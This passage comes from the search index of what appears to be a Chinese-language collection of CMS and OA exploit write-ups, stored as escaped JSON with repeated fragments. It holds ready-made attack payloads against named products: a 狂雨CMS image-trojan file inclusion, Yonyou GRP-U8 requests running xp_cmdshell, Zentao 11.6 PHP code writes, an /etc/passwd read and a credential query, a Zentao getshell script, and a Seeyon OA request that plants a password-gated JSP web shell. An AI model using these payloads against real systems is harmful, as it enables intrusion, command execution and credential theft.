\u53ef\u4ee5\u770b\u5230\u6240\u6709\u6570\u636e\u5e93\u4fe1\u606f\u5168\u5728\u4e86 https://xz.aliyun.com/t/7486","title":"\u6f0f\u6d1e\u8be6\u60c5\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%8B%82%E9%9B%A8CMS/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","text":"\u6f0f\u6d1e\u8be6\u60c5 \u00b6 1.\u540e\u53f0\u53ef\u4ee5\u4fee\u6539\u6a21\u677f\u6587\u4ef6\uff0c\u5728\u6a21\u677f\u6587\u4ef6\u4e2d\u8c03\u7528\u6a21\u677f\u4ee3\u7801\u53ef\u5b9e\u73b0\u6587\u4ef6\u5305\u542b 2.\u9996\u5148\u5728\u8bbe\u7f6e\u4e2d\u4e0a\u4f20logo\u5904\uff0c\u4e0a\u4f20\u56fe\u7247\u9a6c\uff0c\u9700\u8981\u6ce8\u610f\u4e0d\u80fd\u662f\u7528\u6237\u7684\u5934\u50cf\u4e0a\u4f20\u5904\u4e0a\u4f20\u6728\u9a6c\uff0c\u56e0\u4e3a\u5934\u50cf\u4f1a\u8fdb\u884c\u7f29\u653e\uff0c\u5bfc\u81f4\u6587\u4ef6\u5185\u5bb9\u88ab\u4fee\u6539 3.\u4e0a\u4f20\u6210\u529f\u540e\u4f1a\u8fd4\u56de\u8def\u5f84\uff0c\u56fe\u7247\u9a6c\u5185\u5bb9\u4e3a<?php phpinfo(); ?>\uff0c\u9700\u8981\u6ce8\u610fphp\u4ee3\u7801\u5fc5\u987b\u5305\u542b\u6700\u540e\u7684?>\uff0c\u5426\u5219\u4f1a\u62a5\u8bed\u6cd5\u9519\u8bef 4.\u8fdb\u5165\u6a21\u677f\u529f\u80fd\u5904\uff0c\u5728index.html\uff0c\u5373\u4e3b\u9875\u6a21\u677f\u4e2d\u6dfb\u52a0\u6a21\u677f\u4ee3\u7801\uff0c\u540c\u6837\u9700\u8981\u6ce8\u610f\uff0c\u8def\u5f84\u4e0d\u80fd\u4ee5/\u5f00\u5934\uff0c\u5426\u5219\u4f1a\u88ab\u627e\u4e0d\u5230\u9519\u8bef {include file=\"uploads/config/20200325/033966a7d27975812915522464e252a3.jpg\" /} \u63a5\u7740\u6253\u5f00\u4e3b\u9875\uff0c\u5373\u53ef\u770b\u5230phpinfo\u4fe1\u606f \u53c2\u8003\u94fe\u63a5 \u00b6 https://xz.aliyun.com/t/7486","title":"\u6587\u4ef6\u5305\u542b"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%8B%82%E9%9B%A8CMS/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#_1","text":"1.\u540e\u53f0\u53ef\u4ee5\u4fee\u6539\u6a21\u677f\u6587\u4ef6\uff0c\u5728\u6a21\u677f\u6587\u4ef6\u4e2d\u8c03\u7528\u6a21\u677f\u4ee3\u7801\u53ef\u5b9e\u73b0\u6587\u4ef6\u5305\u542b 2.\u9996\u5148\u5728\u8bbe\u7f6e\u4e2d\u4e0a\u4f20logo\u5904\uff0c\u4e0a\u4f20\u56fe\u7247\u9a6c\uff0c\u9700\u8981\u6ce8\u610f\u4e0d\u80fd\u662f\u7528\u6237\u7684\u5934\u50cf\u4e0a\u4f20\u5904\u4e0a\u4f20\u6728\u9a6c\uff0c\u56e0\u4e3a\u5934\u50cf\u4f1a\u8fdb\u884c\u7f29\u653e\uff0c\u5bfc\u81f4\u6587\u4ef6\u5185\u5bb9\u88ab\u4fee\u6539 3.\u4e0a\u4f20\u6210\u529f\u540e\u4f1a\u8fd4\u56de\u8def\u5f84\uff0c\u56fe\u7247\u9a6c\u5185\u5bb9\u4e3a<?php phpinfo(); ?>\uff0c\u9700\u8981\u6ce8\u610fphp\u4ee3\u7801\u5fc5\u987b\u5305\u542b\u6700\u540e\u7684?>\uff0c\u5426\u5219\u4f1a\u62a5\u8bed\u6cd5\u9519\u8bef 4.\u8fdb\u5165\u6a21\u677f\u529f\u80fd\u5904\uff0c\u5728index.html\uff0c\u5373\u4e3b\u9875\u6a21\u677f\u4e2d\u6dfb\u52a0\u6a21\u677f\u4ee3\u7801\uff0c\u540c\u6837\u9700\u8981\u6ce8\u610f\uff0c\u8def\u5f84\u4e0d\u80fd\u4ee5/\u5f00\u5934\uff0c\u5426\u5219\u4f1a\u88ab\u627e\u4e0d\u5230\u9519\u8bef {include file=\"uploads/config/20200325/033966a7d27975812915522464e252a3.jpg\" /} \u63a5\u7740\u6253\u5f00\u4e3b\u9875\uff0c\u5373\u53ef\u770b\u5230phpinfo\u4fe1\u606f","title":"\u6f0f\u6d1e\u8be6\u60c5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%8B%82%E9%9B%A8CMS/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#_2","text":"https://xz.aliyun.com/t/7486","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20GRP-u8%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 GRP-u8 \u6f0f\u6d1ePOC \u00b6 POST /Proxy HTTP/1.1 Accept: Accept: */* Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;) Host: host Content-Length: 357 Connection: Keep-Alive Cache-Control: no-cache cVer=9.8.0&dp=<?xml version=\"1.0\" encoding=\"GB2312\"?><R9PACKET version=\"1\"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format=\"text\">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format=\"text\">exec xp_cmdshell 'ipconfig'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>","title":"\u7528\u53cb GRP-u8\u6ce8\u5165\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20GRP-u8%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","text":"GRP-u8","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20GRP-u8%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","text":"POST /Proxy HTTP/1.1 Accept: Accept: */* Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;) Host: host Content-Length: 357 Connection: Keep-Alive Cache-Control: no-cache cVer=9.8.0&dp=<?xml version=\"1.0\" encoding=\"GB2312\"?><R9PACKET version=\"1\"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format=\"text\">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format=\"text\">exec xp_cmdshell 'ipconfig'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>","title":"\u6f0f\u6d1ePOC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8BGRP-U8%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E5%86%85%E6%8E%A7%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u4fe1\u606f: \u00b6 \u7528\u53cb\u516c\u53f8\u6210\u7acb\u4e8e1988\u5e74\uff0c\u5168\u9762\u63d0\u4f9b\u5177\u6709\u81ea\u4e3b\u77e5\u8bc6\u4ea7\u6743\u7684\u4f01\u4e1a\u7ba1\u7406/ERP\u8f6f\u4ef6\u3001\u670d\u52a1\u4e0e\u89e3\u51b3\u65b9\u6848\uff0c\u662f\u4e2d\u56fd\u6700\u5927\u7684\u7ba1\u7406\u8f6f\u4ef6\u3001ERP\u8f6f\u4ef6\u3001\u96c6\u56e2\u7ba1\u7406\u8f6f\u4ef6\u3001\u4eba\u529b\u8d44\u6e90\u7ba1\u7406\u8f6f\u4ef6\u3001\u5ba2\u6237\u5173\u7cfb\u7ba1\u7406\u8f6f\u4ef6\u53ca\u5c0f\u578b\u4f01\u4e1a\u7ba1\u7406\u8f6f\u4ef6\u63d0\u4f9b\u5546\u3002\u5176GRP-U8\u884c\u653f\u4e8b\u4e1a\u5185\u63a7\u7ba1\u7406\u8f6f\u4ef6\u7279\u5b9a\u7248\u672c\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\uff0c\u53ef\u7528\u4e8e\u547d\u4ee4\u6267\u884c\u6267\u884c\u3002 \u6f0f\u6d1e\u590d\u73b0: \u00b6 fofa_dork: \u201c\u7528\u53cbGRP-u8\u201d POC: \u00b6 ``` POST /Proxy HTTP/1.1 Accept: Accept: / Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;) Host: host Content-Length: 357 Connection: Keep-Alive Cache-Control: no-cache cVer=9.8.0&dp=<?xml version=\"1.0\" encoding=\"GB2312\"?> XML AS_DataRequest ProviderName DataSetProviderData Data exec xp_cmdshell 'net user' ```\u8f93\u51famd5\u503c\uff0c\u7528\u4e8epoc\u9a8c\u8bc1\uff1a \u4f7f\u7528MSSQL xp_cmdshell\u6267\u884c\u547d\u4ee4 \u4fee\u590d\u65b9\u6848: \u00b6 \u8054\u7cfb\u7528\u53cb\u5b98\u65b9\u83b7\u5f97\u5b89\u5168\u5347\u7ea7\u65b9\u6848","title":"\u7528\u53cbGRP-U8\u884c\u653f\u4e8b\u4e1a\u5185\u63a7\u7ba1\u7406\u8f6f\u4ef6SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8BGRP-U8%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E5%86%85%E6%8E%A7%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","text":"\u7528\u53cb\u516c\u53f8\u6210\u7acb\u4e8e1988\u5e74\uff0c\u5168\u9762\u63d0\u4f9b\u5177\u6709\u81ea\u4e3b\u77e5\u8bc6\u4ea7\u6743\u7684\u4f01\u4e1a\u7ba1\u7406/ERP\u8f6f\u4ef6\u3001\u670d\u52a1\u4e0e\u89e3\u51b3\u65b9\u6848\uff0c\u662f\u4e2d\u56fd\u6700\u5927\u7684\u7ba1\u7406\u8f6f\u4ef6\u3001ERP\u8f6f\u4ef6\u3001\u96c6\u56e2\u7ba1\u7406\u8f6f\u4ef6\u3001\u4eba\u529b\u8d44\u6e90\u7ba1\u7406\u8f6f\u4ef6\u3001\u5ba2\u6237\u5173\u7cfb\u7ba1\u7406\u8f6f\u4ef6\u53ca\u5c0f\u578b\u4f01\u4e1a\u7ba1\u7406\u8f6f\u4ef6\u63d0\u4f9b\u5546\u3002\u5176GRP-U8\u884c\u653f\u4e8b\u4e1a\u5185\u63a7\u7ba1\u7406\u8f6f\u4ef6\u7279\u5b9a\u7248\u672c\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\uff0c\u53ef\u7528\u4e8e\u547d\u4ee4\u6267\u884c\u6267\u884c\u3002","title":"\u6f0f\u6d1e\u4fe1\u606f:"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8BGRP-U8%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E5%86%85%E6%8E%A7%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_2","text":"fofa_dork: \u201c\u7528\u53cbGRP-u8\u201d","title":"\u6f0f\u6d1e\u590d\u73b0:"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8BGRP-U8%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E5%86%85%E6%8E%A7%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","text":"``` POST /Proxy HTTP/1.1 Accept: Accept: / Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;) Host: host Content-Length: 357 Connection: Keep-Alive Cache-Control: no-cache cVer=9.8.0&dp=<?xml version=\"1.0\" encoding=\"GB2312\"?> XML AS_DataRequest ProviderName DataSetProviderData Data exec xp_cmdshell 'net user' ```\u8f93\u51famd5\u503c\uff0c\u7528\u4e8epoc\u9a8c\u8bc1\uff1a \u4f7f\u7528MSSQL xp_cmdshell\u6267\u884c\u547d\u4ee4","title":"POC:"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8BGRP-U8%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E5%86%85%E6%8E%A7%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_3","text":"\u8054\u7cfb\u7528\u53cb\u5b98\u65b9\u83b7\u5f97\u5b89\u5168\u5347\u7ea7\u65b9\u6848","title":"\u4fee\u590d\u65b9\u6848:"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6RCE%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 \u7985\u9053 11.6 \u6f0f\u6d1ePOC \u00b6 \u6587\u4ef6\u5199\u5165 \u6f0f\u6d1e\u8303\u56f4 \u00b6 \u7985\u9053 11.6 \u6f0f\u6d1ePOC \u00b6 \u4e09.\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e \u00b6 1\uff09\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u547d\u4ee4phpnifo()\uff1b Payload 1: http://127.0.0.1/zentaopms/www/api-getModel-editor-save-filePath=1111 POST: fileContent=<?php phpinfo(); ?> Payload2: http://127.0.0.1/zentaopms/www/ api-getModel-api-getMethod-filePath=1111/1 POST: fileContent=<?php phpinfo(); ?> 2\uff09\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u547d\u4ee4system('whoami'); Payload 1: http://127.0.0.1/zentaopms/www/api-getModel-editor-save-filePath=2222 POST: fileContent=<?php system('whoami'); ?> Payload 2: http://127.0.0.1/zentaopms/www/ api-getModel-api-getMethod-filePath=2222/2 POST: fileContent=<?php system('whoami'); ?>","title":"\u7985\u905311.6RCE\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6RCE%E6%BC%8F%E6%B4%9E/#_1","text":"\u7985\u9053 11.6","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6RCE%E6%BC%8F%E6%B4%9E/#poc","text":"\u6587\u4ef6\u5199\u5165","title":"\u6f0f\u6d1ePOC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6RCE%E6%BC%8F%E6%B4%9E/#_2","text":"\u7985\u9053 11.6","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6RCE%E6%BC%8F%E6%B4%9E/#poc_1","text":"","title":"\u6f0f\u6d1ePOC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6RCE%E6%BC%8F%E6%B4%9E/#_3","text":"1\uff09\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u547d\u4ee4phpnifo()\uff1b Payload 1: http://127.0.0.1/zentaopms/www/api-getModel-editor-save-filePath=1111 POST: fileContent=<?php phpinfo(); ?> Payload2: http://127.0.0.1/zentaopms/www/ api-getModel-api-getMethod-filePath=1111/1 POST: fileContent=<?php phpinfo(); ?> 2\uff09\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u547d\u4ee4system('whoami'); Payload 1: http://127.0.0.1/zentaopms/www/api-getModel-editor-save-filePath=2222 POST: fileContent=<?php system('whoami'); ?> Payload 2: http://127.0.0.1/zentaopms/www/ api-getModel-api-getMethod-filePath=2222/2 POST: fileContent=<?php system('whoami'); ?>","title":"\u4e09.\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 \u7985\u9053 11.6 \u6f0f\u6d1ePOC \u00b6 http://127.0.0.1/zentaopms_11.6/www/api-getModel-file-parseCSV-fileName=/etc/passwd","title":"\u7985\u905311.6\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#_1","text":"\u7985\u9053 11.6","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#poc","text":"http://127.0.0.1/zentaopms_11.6/www/api-getModel-file-parseCSV-fileName=/etc/passwd","title":"\u6f0f\u6d1ePOC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 \u7985\u9053 11.6 \u6f0f\u6d1ePOC \u00b6 Payload: http://127.0.0.1/zentaopms/www/api-getModel-api-sql-sql=select+account,password+from+zt_user","title":"\u7985\u905311.6\u540e\u53f0SQL\u6ce8\u5165"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/#_1","text":"\u7985\u9053 11.6","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/#poc","text":"Payload: http://127.0.0.1/zentaopms/www/api-getModel-api-sql-sql=select+account,password+from+zt_user","title":"\u6f0f\u6d1ePOC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%938.2%20-%209.2.1%E5%89%8D%E5%8F%B0Getshell/","text":"zentao-getshell \u7985\u90538.2 - 9.2.1\u524d\u53f0Getshell \u00b6 Python Usage \u00b6 \u811a\u672cgithub\u83b7\u53d6 python exp.py http://127.0.0.1:81/ jas502n.php \u6765\u6e90 \u00b6 https://github.com/jas502n/zentao-getshell","title":"zentao-getshell \u7985\u90538.2 - 9.2.1\u524d\u53f0Getshell"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%938.2%20-%209.2.1%E5%89%8D%E5%8F%B0Getshell/#zentao-getshell-82-921getshell","text":"","title":"zentao-getshell \u7985\u90538.2 - 9.2.1\u524d\u53f0Getshell"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%938.2%20-%209.2.1%E5%89%8D%E5%8F%B0Getshell/#python-usage","text":"\u811a\u672cgithub\u83b7\u53d6 python exp.py http://127.0.0.1:81/ jas502n.php","title":"Python Usage"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%938.2%20-%209.2.1%E5%89%8D%E5%8F%B0Getshell/#_1","text":"https://github.com/jas502n/zentao-getshell","title":"\u6765\u6e90"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%938.2-9.2.1%E6%B3%A8%E5%85%A5GetShell/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 \u7985\u90538.9-9.2.1 \u6f0f\u6d1e\u9a8c\u8bc1 \u00b6 \u8bfb\u53d6\u7248\u672c\u53f7\uff1a http://********/index.php?mode=getconfig \u67e5\u770b\u5fd8\u8bb0\u5bc6\u7801\u6587\u672c\u8def\u5f84\uff1a``` http://********/zentao/user-reset.html exp\u53ca\u4f7f\u7528\u65b9\u6cd5\uff1a \u5728\u94fe\u63a5\u4e2d\u8f93\u5165\u6784\u9020\u597d\u7684\u8bed\u53e5base64\u7f16\u7801\u540e\u5b57\u7b26\u4e32\u5373\u53ef","title":"\u7985\u90538.2-9.2.1\u6ce8\u5165GetShell"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%938.2-9.2.1%E6%B3%A8%E5%85%A5GetShell/#_1","text":"\u7985\u90538.9-9.2.1","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%938.2-9.2.1%E6%B3%A8%E5%85%A5GetShell/#_2","text":"\u8bfb\u53d6\u7248\u672c\u53f7\uff1a http://********/index.php?mode=getconfig \u67e5\u770b\u5fd8\u8bb0\u5bc6\u7801\u6587\u672c\u8def\u5f84\uff1a``` http://********/zentao/user-reset.html exp\u53ca\u4f7f\u7528\u65b9\u6cd5\uff1a \u5728\u94fe\u63a5\u4e2d\u8f93\u5165\u6784\u9020\u597d\u7684\u8bed\u53e5base64\u7f16\u7801\u540e\u5b57\u7b26\u4e32\u5373\u53ef","title":"\u6f0f\u6d1e\u9a8c\u8bc1"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9COA%E7%B3%BB%E7%BB%9F%E5%A4%9A%E7%89%88%E6%9C%ACGetshell%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","text":"\u5f71\u54cd\u7248\u672c \u00b6 \u81f4\u8fdcA8-V5\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V6.1sp1 \u81f4\u8fdcA8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6V7.0\u3001V7.0sp1\u3001V7.0sp2\u3001V7.0sp3 \u81f4\u8fdcA8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6V7.1 \u5229\u7528\u524d\u63d0 \u8bbf\u95ee/seeyon/htmlofficeservlet\u51fa\u73b0 DBSTEP V3.0 0 21 0 htmoffice operate err POC \u8bf7\u6c42\u5305 \u00b6 POST /seeyon/htmlofficeservlet HTTP/1.1 Content-Length: 1121 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Host: xxxxxxxxx Pragma: no-cache DBSTEP V3.0 355 0 666 DBSTEP=OKMLlKlV OPTION=S3WYOSWLBSGr currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66 CREATEDATE=wUghPB3szB3Xwg66 RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6 originalFileId=wV66 originalCreateDate=wUghPB3szB3Xwg66 FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6 needReadFile=yRWZdAS6 originalCreateDate=wLSGP4oEzLKAz4=iz=66 <%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+\"\\n\");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if(\"asasd3344\".equals(request.getParameter(\"pwd\"))&&!\"\".equals(request.getParameter(\"cmd\"))){out.println(\"<pre>\"+excuteCmd(request.getParameter(\"cmd\")) + \"</pre>\");}else{out.println(\":-)\");}%>6e4f045d4b8506bf492ada7e3390d7ce \u54cd\u5e94\u5305 \u00b6 DBSTEP V3.0 386 0 666 DBSTEP=OKMLlKlV OPTION=S3WYOSWLBSGr currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66 CREATEDATE=wUghPB3szB3Xwg66 RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6 originalFileId=wV66 originalCreateDate=wUghPB3szB3Xwg66 FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6 needReadFile=yRWZdAS6 originalCreateDate=wLSGP4oEzLKAz4=iz=66 CLIENTIP=wLCXqUKAP7uhw4g5zi=6 <%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+\"\\n\");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if(\"asasd3344\".equals(request.getParameter(\"pwd\"))&&!\"\".equals(request.getParameter(\"cmd\"))){out.println(\"<pre>\"+excuteCmd(request.getParameter(\"cmd\")) + \"</pre>\");}else{out.println(\":-)\");}%>","title":"\u81f4\u8fdcOA\u7cfb\u7edf\u591a\u7248\u672cGetshell\u6f0f\u6d1e\u590d\u73b0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9COA%E7%B3%BB%E7%BB%9F%E5%A4%9A%E7%89%88%E6%9C%ACGetshell%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#_1","text":"\u81f4\u8fdcA8-V5\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V6.1sp1 \u81f4\u8fdcA8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6V7.0\u3001V7.0sp1\u3001V7.0sp2\u3001V7.0sp3 \u81f4\u8fdcA8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6V7.1 \u5229\u7528\u524d\u63d0 \u8bbf\u95ee/seeyon/htmlofficeservlet\u51fa\u73b0 DBSTEP V3.0 0 21 0 htmoffice operate err POC","title":"\u5f71\u54cd\u7248\u672c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9COA%E7%B3%BB%E7%BB%9F%E5%A4%9A%E7%89%88%E6%9C%ACGetshell%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#_2","text":"POST /seeyon/htmlofficeservlet HTTP/1.1 Content-Length: 1121 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Host: xxxxxxxxx Pragma: no-cache DBSTEP V3.0 355 0 666 DBSTEP=OKMLlKlV OPTION=S3WYOSWLBSGr currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66 CREATEDATE=wUghPB3szB3Xwg66 RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6 originalFileId=wV66 originalCreateDate=wUghPB3szB3Xwg66 FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6 needReadFile=yRWZdAS6 originalCreateDate=wLSGP4oEzLKAz4=iz=66 <%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+\"\\n\");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if(\"asasd3344\".equals(request.getParameter(\"pwd\"))&&!\"\".equals(request.getParameter(\"cmd\"))){out.println(\"<pre>\"+excuteCmd(request.getParameter(\"cmd\")) + \"</pre>\");}else{out.println(\":-)\");}%>6e4f045d4b8506bf492ada7e3390d7ce","title":"\u8bf7\u6c42\u5305"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9COA%E7%B3%BB%E7%BB%9F%E5%A4%9A%E7%89%88%E6%9C%ACGetshell%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#_3","text":"DBSTEP V3.0 386 0 666 